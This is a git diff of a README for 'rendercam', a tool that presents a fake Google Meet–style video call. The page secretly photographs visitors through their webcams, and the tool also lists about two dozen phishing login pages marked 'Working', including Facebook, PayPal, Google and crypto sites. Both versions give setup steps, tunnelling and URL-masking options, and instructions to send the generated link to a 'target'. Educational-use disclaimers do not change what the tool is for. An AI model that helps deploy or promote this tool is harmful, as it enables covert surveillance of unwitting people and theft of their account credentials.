@@ -1,52 +1,178 @@
-# rendercam
+<!-- rendercam -->
 
-A website disguised as Google Meet that secretly captures user's faces.
+<h1 align="left">rendercam</h1>
 
-**Disclaimer:** This project is for educational purposes only. Do not use it for malicious activities.
+<p align="left">
+  <a href="https://github.com/render437/rendercam">
+    <img title="Version" src="https://img.shields.io/badge/Version-1.2.2-green?style=for-the-badge&logo=github"></a>
+  <a href="https://github.com/render437/rendercam/blob/main/LICENSE">
+    <img title="License" src="https://img.shields.io/badge/License-GPL_3.0-orange?style=for-the-badge&logo=gnu"></a>
+  <a href="https://github.com/render437/rendercam/stargazers">
+    <img title="Stars" src="https://img.shields.io/github/stars/render437/rendercam?style=for-the-badge&logo=github&color=yellow"></a>
+   <a href="https://github.com/render437/rendercam/issues">
+    <img title="Issues" src="https://img.shields.io/github/issues-raw/render437/rendercam?style=for-the-badge&logo=github&color=purple&label=Issues"></a>
+   <a href="https://github.com/render437/rendercam/network/members">
+    <img title="Forks" src="https://img.shields.io/github/forks/render437/rendercam?style=for-the-badge&logo=github&color=magenta"></a>
+   <a href="https://github.com/render437/rendercam/pulls">
+     <img title="Pull Requests" src="https://img.shields.io/github/issues-pr-raw/render437/rendercam?style=for-the-badge&logo=github&color=darkblue&label=Pull%20Requests"></a>
+</p>
 
-## Setup
+<p align="left">
+  <img src="https://img.shields.io/badge/Author-render437-blue?style=flat-square">
+  <img src="https://img.shields.io/badge/Open%20Source-Yes-darkgreen?style=flat-square">
+  <img src="https://img.shields.io/badge/Maintained%3F-Yes-lightblue?style=flat-square">
+  <img src="https://img.shields.io/badge/Written%20In-Bash-darkcyan?style=flat-square">
+</p>
 
-1.  Clone the repository:
 
-    ```bash
-    git clone https://github.com/render437/rendercam.git
-    cd rendercam
-    ```
 
-2.  Create a virtual environment:
+<p align="left"><b>A tool used to create a fake video call that secretly captures user's faces through their webcam.
+</b></p>
 
-    ```bash
-    python3 -m venv venv
-    ```
+---
 
-3.  Activate the virtual environment:
+<h3 style="text-align:center;">Disclaimer</h3>
 
-    ```bash
-    source venv/bin/activate
-    ```
+*Any actions and or activities related to <b>rendercam</b> is solely your responsibility. The misuse of this toolkit can result in **criminal charges** brought against the persons in question. **The contributors will not be held responsible** in the event any criminal charges be brought against any individuals misusing this toolkit to break the law.*
 
-4.  Install the dependencies:
+***This toolkit contains materials that can be potentially damaging or dangerous for social media**. Refer to the laws in your province/country before accessing, using,or in any other way utilizing this in a wrong way.*
+    
+*This tool is provided strictly for educational and research purposes to demonstrate how phishing works and what it is. Do not use any information, code, or techniques contained here to attempt unauthorized access to someone else’s accounts or systems — **doing so is illegal**. Use this toolkit at your own risk.*
 
-    ```bash
-    pip install flask opencv-python localxpose pyngrok
-    ```
+*Do not attempt to violate the law with anything contained here. **If this is your intention, then get the fuck out of here**!*
 
-5.  Run the main script:
+*If you are unsure about the legality of an action, seek professional legal advice before proceeding. **You shall not misuse the information to gain unauthorized access to someones social media**.*
+  
+*This project is for educational, penetration-testing, or phishing-simulation purposes only.*
+- *Only demonstrates how phishing works, **Not for malicious use.***
 
-    ```bash
-    python3 main.py
-    ```
+---
 
-## Usage
+### Features
 
-1.  The script will guide you through the setup.
-2.  You will be prompted to enter the number of pictures to take.
-3.  You will be prompted to choose a hosting method:
-    *   `localhost`
-    *   `cloudflare`
-    *   `ngrok`
-4.  The script will automatically install dependencies and set up the chosen hosting method.
-5.  Share the generated URL with the target.
-6.  Captured images will be saved in the `captured_images` directory on the attacker's device.
+- Latest and updated login pages.
+- Beginner friendly
+- Multiple tunneling options
+  - Localhost
+  - Cloudflared
+- Mask URL support(might not work)
+- Docker support
 
-**Note:** Make sure you have Python 3 installed and up-to-date. Remember to activate the virtual environment before running the script.
+---
+
+### Available Links
+
+| Website     | Status                         | Website     | Status                          |
+|-------------|--------------------------------|-------------|---------------------------------|
+| **Adobe**       | Working                        | **Github**      | Working                          |
+| **Airbnb**      | Working                        | **Shopify**     | Working (won't grab username)    |
+| **Facebook**    | Working                        | **Ebay**        | Working                          |
+| **Instagram**   | Working                        | **Pinterest**   | Working                          |
+| **Google**      | Working                        | **Discord**     | Working                          |
+| **Bitcoin**     | Working                        | **Reddit**      | Working                          |
+| **Crypto**      | Working                        | **Messenger**   | Working (needs new html file)    |
+| **Microsoft**   | Working                        | **Roblox**      | Working                          |
+| **Netflix**     | Working                        | **Steam**       | Working                          |
+| **Paypal**      | Working                        | **Playstation** | Working                          |
+| **Tiktok**      | Working                        | **Xbox**        | Working                          |
+| **Snapchat**    | Working                        | **Verizon**     | Broken                           |
+| **Spotify**     | Working                        | **Wifi**        | Working                          |
+
+***- More to be added in the future!***
+
+---
+
+### Installation
+
+- Just, clone this repository -
+  ```
+  git clone --depth=1 https://github.com/render437/rendercam.git
+  ```
+
+- Create and activate a virtual environment -
+  ```
+  python3 -m venv venv
+  source venv/bin/activate
+  ```
+
+- Now go to cloned directory and run `rendercam.sh` -
+  ```
+  $ cd rendercam
+  $ bash rendercam.sh
+  ```
+
+- On first launch, it'll install the dependencies automatically. That's it, ***rendercam*** is installed!
+
+---
+
+### All-In-One Command
+  ```
+  git clone --depth=1 https://github.com/render437/rendercam.git; cd rendercam; bash rendercam.sh
+  ```
+
+---
+
+### Uninstall Process
+
+- Just paste this command into your terminal -
+  ```
+  cd; sudo rm -r rendercam
+  ```
+
+---
+
+  <summary><h3>Dependencies</h3></summary>
+
+<b>rendercam</b> requires following programs to run properly - 
+- `git`
+- `curl`
+- `php`
+> All the dependencies will be installed automatically when you run **rendercam** for the first time.
+</details>
+
+  <summary><h3>Tested on</h3></summary>
+
+- **Ubuntu**
+- **Debian**
+- **Arch**
+- **Manjaro**
+- **Fedora**
+- **Termux**
+</details>
+
+---
+
+<h3 align="center"><i> Workflow </i></h3>
+<p align="center">
+  <img src=".github/misc/workflow.gif"/>
+</p>
+
+---
+
+### Collaborators
+
+Thanks to these amazing people for helping me build and improve this project!
+
+
+| Collaborator | Contribution |
+|-------------|--------------|
+| [xroche](https://github.com/xroche) | Set up Cryptocurrency HTML website |
+| [Aditya Shakya](https://github.com/adi1090x) | UI/UX design and styling |
+| [htr-tech](https://github.com/htr-tech) | Helped set up Cloudflare infrastructure and Paypal HTML Website|
+| [Ali Milani](https://github.com/AliMilani) | Discord and Instagram HTML and Image Hosting |
+| [KasRoudra](https://github.com/KasRoudra) | Implemented and configured Facebook OAuth login methods |
+| [TripleHat](https://github.com/TripleHat) | Configured Web Application Exploitation |
+| [Mr.Derek](https://github.com/E343IO) | Developed Link Shortener Infrastructure |
+
+---
+
+### Find Me on:
+<p align="left">
+  <a href="https://beacons.ai/render437" target="_blank">
+  <img src="https://img.shields.io/badge/Socials-grey?style=for-the-badge&logo=linktree&logoColor=white">
+</a>
+  <a href="https://github.com/render437" target="_blank"><img src="https://img.shields.io/badge/Github-blue?style=for-the-badge&logo=github"></a>
+</p>
+
+
+<!-- // -->
